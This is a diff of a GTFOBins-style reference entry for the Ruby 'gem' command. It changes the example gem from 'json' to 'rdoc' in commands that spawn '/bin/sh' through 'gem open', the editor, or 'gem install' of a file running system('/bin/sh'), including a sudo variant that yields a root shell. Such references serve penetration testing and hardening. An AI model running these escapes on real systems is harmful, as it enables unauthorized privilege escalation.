@@ -1,11 +1,11 @@
 ---
 functions:
   shell:
-    - description: This requires the name of an installed gem to be provided (`json` is usually installed).
-      code: gem open -e "/bin/sh -c /bin/sh" json
-    - description: This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`json` is usually installed).
+    - description: This requires the name of an installed gem to be provided (`rdoc` is usually installed).
+      code: gem open -e "/bin/sh -c /bin/sh" rdoc
+    - description: This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).
       code: |
-        gem open json
+        gem open rdoc
         :!/bin/sh
     - description: This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
       code: |
@@ -18,6 +18,6 @@ functions:
         echo 'system("/bin/sh")' > $TF/x
         gem install --file $TF/x
   sudo:
-    - description: This requires the name of an installed gem to be provided (`json` is usually installed).
-      code: sudo gem open -e "/bin/sh -c /bin/sh" json
+    - description: This requires the name of an installed gem to be provided (`rdoc` is usually installed).
+      code: sudo gem open -e "/bin/sh -c /bin/sh" rdoc
 ---
